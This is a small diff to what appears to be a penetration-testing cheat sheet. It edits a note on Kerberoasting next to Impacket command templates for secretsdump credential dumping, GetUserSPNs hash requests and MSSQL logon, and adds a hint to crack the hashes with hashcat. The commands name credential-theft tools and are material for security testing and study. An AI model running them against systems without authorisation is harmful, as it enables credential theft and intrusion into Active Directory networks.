@@ -122,8 +122,8 @@ secretsdump.py '{username}@{IP}'
 ```
 GetUserSPNs.py -request -{NETBIOSNAME}-ip {IP} {DOMAIN}/{NAME}:{PASSWORD}
 ```
-> hash dump via keberoasting using SPN
-
+> - hash dump via keberoasting using SPN
+> - Need to hashcat to unveil the hash. Refer to bruteforce on usage
 ## MS sql logon 
 ```
 mssqlclient.py {username}@{IP}
